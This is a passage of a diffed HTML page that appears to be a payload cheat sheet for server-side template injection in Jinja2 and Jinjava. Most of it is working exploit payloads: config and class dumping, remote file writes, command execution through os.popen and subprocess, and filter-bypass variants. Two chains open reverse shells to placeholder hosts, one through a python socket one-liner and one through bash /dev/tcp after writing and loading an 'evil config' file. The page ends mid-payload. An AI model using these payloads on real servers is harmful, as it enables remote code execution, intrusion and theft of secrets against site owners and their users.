+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>}}[[<span style="color:#ae81ff">5</span><span style="color:#f92672">*</span><span style="color:#ae81ff">5</span>]]
+</span></span><span style="display:flex;"><span>{{<span style="color:#ae81ff">7</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;7&#39;</span>}} would result <span style="color:#f92672">in</span> <span style="color:#ae81ff">7777777</span>
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">.</span>items()}}
+</span></span></code></pre></div><p>Jinja2 is used by Python Web Frameworks such as Django or Flask.
+The above injections have been tested on a Flask application.</p>
+<h3 id="jinja2---template-format">
+  Jinja2 - Template format
+  <a class="anchor" href="#jinja2---template-format">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> extends <span style="color:#e6db74">&#34;layout.html&#34;</span> <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> block body <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;</span>ul<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>li<span style="color:#f92672">&gt;&lt;</span>a href<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{{ user.url }}&#34;</span><span style="color:#f92672">&gt;</span>{{ user<span style="color:#f92672">.</span>username }}<span style="color:#f92672">&lt;/</span>a<span style="color:#f92672">&gt;&lt;/</span>li<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  {<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/</span>ul<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endblock <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h3 id="jinja2---debug-statement">
+  Jinja2 - Debug Statement
+  <a class="anchor" href="#jinja2---debug-statement">#</a>
+</h3>
+<p>If the Debug Extension is enabled, a <code>{% debug %}</code> tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&lt;</span>pre<span style="color:#f92672">&gt;</span>{<span style="color:#f92672">%</span> debug <span style="color:#f92672">%</span>}<span style="color:#f92672">&lt;/</span>pre<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Source: <a href="https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement">https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement</a></p>
+<h3 id="jinja2---dump-all-used-classes">
+  Jinja2 - Dump all used classes
+  <a class="anchor" href="#jinja2---dump-all-used-classes">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ []<span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>base<span style="color:#f92672">.</span>subclasses() }}
+</span></span><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>class<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>subclasses()}}
+</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__() }}
+</span></span></code></pre></div><p>Access <code>__globals__</code> and <code>__builtins__</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__ }}
+</span></span></code></pre></div><h3 id="jinja2---dump-all-config-variables">
+  Jinja2 - Dump all config variables
+  <a class="anchor" href="#jinja2---dump-all-config-variables">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> key, value <span style="color:#f92672">in</span> config<span style="color:#f92672">.</span>iteritems() <span style="color:#f92672">%</span>}
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>dt<span style="color:#f92672">&gt;</span>{{ key<span style="color:#f92672">|</span>e }}<span style="color:#f92672">&lt;/</span>dt<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;</span>dd<span style="color:#f92672">&gt;</span>{{ value<span style="color:#f92672">|</span>e }}<span style="color:#f92672">&lt;/</span>dd<span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h3 id="jinja2---write-into-remote-file">
+  Jinja2 - Write into remote file
+  <a class="anchor" href="#jinja2---write-into-remote-file">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/var/www/html/myflaskapp/hello.txt&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;Hello here !&#39;</span>) }}
+</span></span></code></pre></div><h3 id="jinja2---remote-code-execution">
+  Jinja2 - Remote Code Execution
+  <a class="anchor" href="#jinja2---remote-code-execution">#</a>
+</h3>
+<p>Listen for connection</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -lnvp <span style="color:#ae81ff">8000</span>
+</span></span></code></pre></div><h4 id="jinja2---forcing-output-on-blind-rce">
+  Jinja2 - Forcing output on blind RCE
+  <a class="anchor" href="#jinja2---forcing-output-on-blind-rce">#</a>
+</h4>
+<p>You can import Flask functions to return an output from the vulnerable page.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>{{
+</span></span><span style="display:flex;"><span>x<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>exec(<span style="color:#e6db74">&#34;from flask import current_app, after_this_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@after_this_request</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hook</span>(<span style="color:#f92672">*</span>args, <span style="color:#f92672">**</span>kwargs):
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> make_response
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> make_response(<span style="color:#e6db74">&#39;Powned&#39;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;)</span>
+</span></span><span style="display:flex;"><span>}}
+</span></span></code></pre></div><h4 id="exploit-the-ssti-by-calling-ospopenread">
+  Exploit the SSTI by calling os.popen().read()
+  <a class="anchor" href="#exploit-the-ssti-by-calling-ospopenread">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>__builtins__<span style="color:#f92672">.</span>__import__(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>But when <code>__builtins__</code> is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>joiner<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span><span style="display:flex;"><span>{{ self<span style="color:#f92672">.</span>_TemplateReference__context<span style="color:#f92672">.</span>namespace<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>We can use these shorter payloads:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ cycler<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span><span style="display:flex;"><span>{{ joiner<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span><span style="display:flex;"><span>{{ namespace<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__<span style="color:#f92672">.</span>os<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>Source <a href="https://twitter.com/podalirius_">@podalirius_</a> : <a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/">https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/</a></p>
+<p>With <a href="https://github.com/p0dalirius/objectwalker">objectwalker</a> we can find a path to the <code>os</code> module from <code>lipsum</code>. This is the shortest payload known to achieve RCE in a Jinja2 template:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ lipsum<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#34;os&#34;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">.</span>read() }}
+</span></span></code></pre></div><p>Source: <a href="https://twitter.com/podalirius_/status/1655970628648697860">https://twitter.com/podalirius_/status/1655970628648697860</a></p>
+<h4 id="exploit-the-ssti-by-calling-subprocesspopen">
+  Exploit the SSTI by calling subprocess.Popen
+  <a class="anchor" href="#exploit-the-ssti-by-calling-subprocesspopen">#</a>
+</h4>
+<p>:warning: the number 396 will vary depending of the application.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">396</span>](<span style="color:#e6db74">&#39;cat flag.txt&#39;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>,stdout<span style="color:#f92672">=-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>communicate()[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>strip()}}
+</span></span><span style="display:flex;"><span>{{config<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__init__<span style="color:#f92672">.</span>__globals__[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#39;ls&#39;</span>)<span style="color:#f92672">.</span>read()}}
+</span></span></code></pre></div><h4 id="exploit-the-ssti-by-calling-popen-without-guessing-the-offset">
+  Exploit the SSTI by calling Popen without guessing the offset
+  <a class="anchor" href="#exploit-the-ssti-by-calling-popen-without-guessing-the-offset">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(<span style="color:#e6db74">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">ip</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">/bin/cat</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">, </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">flag.txt</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">]);&#39;&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>zfill(<span style="color:#ae81ff">417</span>)}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> endfor <span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>Simply modification of payload to clean up output and facilitate command input (<a href="https://twitter.com/SecGus/status/1198976764351066113">https://twitter.com/SecGus/status/1198976764351066113</a>)
+In another GET parameter include a variable named &ldquo;input&rdquo; that contains the command you want to run (For example: &amp;input=ls)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{<span style="color:#f92672">%</span> <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> ()<span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__base__<span style="color:#f92672">.</span>__subclasses__() <span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span> <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;warning&#34;</span> <span style="color:#f92672">in</span> x<span style="color:#f92672">.</span>__name__ <span style="color:#f92672">%</span>}{{x()<span style="color:#f92672">.</span>_module<span style="color:#f92672">.</span>__builtins__[<span style="color:#e6db74">&#39;__import__&#39;</span>](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>popen(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>input)<span style="color:#f92672">.</span>read()}}{<span style="color:#f92672">%</span>endif<span style="color:#f92672">%</span>}{<span style="color:#f92672">%</span>endfor<span style="color:#f92672">%</span>}
+</span></span></code></pre></div><h4 id="exploit-the-ssti-by-writing-an-evil-config-file">
+  Exploit the SSTI by writing an evil config file.
+  <a class="anchor" href="#exploit-the-ssti-by-writing-an-evil-config-file">#</a>
+</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># evil config</span>
+</span></span><span style="display:flex;"><span>{{ <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>__mro__[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">.</span>__subclasses__()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>)<span style="color:#f92672">.</span>write(<span style="color:#e6db74">&#39;from subprocess import check_output</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">RUNCMD = check_output</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>) }}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># load the evil config</span>
+</span></span><span style="display:flex;"><span>{{ config<span style="color:#f92672">.</span>from_pyfile(<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>) }}  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># connect to evil host</span>
+</span></span><span style="display:flex;"><span>{{ config[<span style="color:#e6db74">&#39;RUNCMD&#39;</span>](<span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&#34;&#39;</span>,shell<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>) }}
+</span></span></code></pre></div><h3 id="jinja2---filter-bypass">
+  Jinja2 - Filter bypass
+  <a class="anchor" href="#jinja2---filter-bypass">#</a>
+</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>request<span style="color:#f92672">.</span>__class__
+</span></span><span style="display:flex;"><span>request[<span style="color:#e6db74">&#34;__class__&#34;</span>]
+</span></span></code></pre></div><p>Bypassing <code>_</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr([request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>class<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>usc<span style="color:#f92672">=</span>_
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}
+</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([<span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,<span style="color:#e6db74">&#34;class&#34;</span>,<span style="color:#e6db74">&#34;_&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>]<span style="color:#f92672">|</span>join)}}
+</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr([<span style="color:#e6db74">&#34;__&#34;</span>,<span style="color:#e6db74">&#34;class&#34;</span>,<span style="color:#e6db74">&#34;__&#34;</span>]<span style="color:#f92672">|</span>join)}}
+</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#34;__class__&#34;</span>)}}
+</span></span><span style="display:flex;"><span>{{request<span style="color:#f92672">.</span>__class__}}
+</span></span></code></pre></div><p>Bypassing <code>[</code> and <code>]</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr((request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>class,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>usc<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>)<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>class<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>usc<span style="color:#f92672">=</span>_
+</span></span><span style="display:flex;"><span><span style="color:#f92672">or</span>
+</span></span><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>getlist(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>l)<span style="color:#f92672">|</span>join)}}<span style="color:#f92672">&amp;</span>l<span style="color:#f92672">=</span>a<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>class<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_
+</span></span></code></pre></div><p>Bypassing <code>|join</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>http:<span style="color:#f92672">//</span>localhost:<span style="color:#ae81ff">5000</span><span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">?</span>exploit<span style="color:#f92672">=</span>{{request<span style="color:#f92672">|</span>attr(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>f<span style="color:#f92672">|</span>format(request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a,request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>a))}}<span style="color:#f92672">&amp;</span>f<span style="color:#f92672">=%</span>s<span style="color:#f92672">%</span>sclass<span style="color:#f92672">%</span>s<span style="color:#f92672">%</span>s<span style="color:#f92672">&amp;</span>a<span style="color:#f92672">=</span>_
+</span></span></code></pre></div><p>Bypassing most common filters (&rsquo;.&rsquo;,&rsquo;_&rsquo;,&rsquo;|join&rsquo;,&rsquo;[&rsquo;,&rsquo;]&rsquo;,&lsquo;mro&rsquo; and &lsquo;base&rsquo;) by <a href="https://twitter.com/SecGus">https://twitter.com/SecGus</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{request<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;application&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">globals</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">getitem</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">builtins</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">getitem</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">import</span><span style="color:#ae81ff">\x5f\x5f</span><span style="color:#e6db74">&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">|</span>attr(<span style="color:#e6db74">&#39;read&#39;</span>)()}}
+</span></span></code></pre></div><hr>
 <h2 id="jinjava">
   Jinjava
   <a class="anchor" href="#jinjava">#</a>
@@ -1924,11 +2262,26 @@ https://github.com/alex-shpak/hugo-book
 <blockquote>
 <p>Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).</p>
 </blockquote>
-<h3 id="need-bugfix-for-jinjava">
-  NEED BUGFIX FOR JINJAVA
-  <a class="anchor" href="#need-bugfix-for-jinjava">#</a>
+<h3 id="jinjava---basic-injection">
+  Jinjava - Basic injection
+  <a class="anchor" href="#jinjava---basic-injection">#</a>
 </h3>
-<hr>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>toUpperCase()}} would result <span style="color:#f92672">in</span> <span style="color:#e6db74">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>{{ request }} would <span style="color:#66d9ef">return</span> a request object like com<span style="color:#f92672">.</span>[<span style="color:#f92672">...</span>]<span style="color:#f92672">.</span>context<span style="color:#f92672">.</span>TemplateContextRequest<span style="color:#f92672">@</span><span style="color:#ae81ff">23548206</span>
+</span></span></code></pre></div><p>Jinjava is an open source project developed by Hubspot, available at <a href="https://github.com/HubSpot/jinjava/">https://github.com/HubSpot/jinjava/</a></p>
+<h3 id="jinjava---command-execution">
+  Jinjava - Command execution
+  <a class="anchor" href="#jinjava---command-execution">#</a>
+</h3>
+<p>Fixed by <a href="https://github.com/HubSpot/jinjava/pull/230">https://github.com/HubSpot/jinjava/pull/230</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{<span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">.</span>getClass()<span style="color:#f92672">.</span>forName(<span style="color:#e6db74">&#39;javax.script.ScriptEngineManager&#39;</span>)<span style="color:#f92672">.</span>newInstance()<span style="color:#f92672">.</span>getEngineByName(<span style="color:#e6db74">&#39;JavaScript&#39;</span>)<span style="color:#f92672">.</span>eval(\<span style="color:#e6db74">&#34;new java.lang.String(&#39;xxx&#39;)</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">)}}</span>
+</span></span><span style="display:flex;"><span>
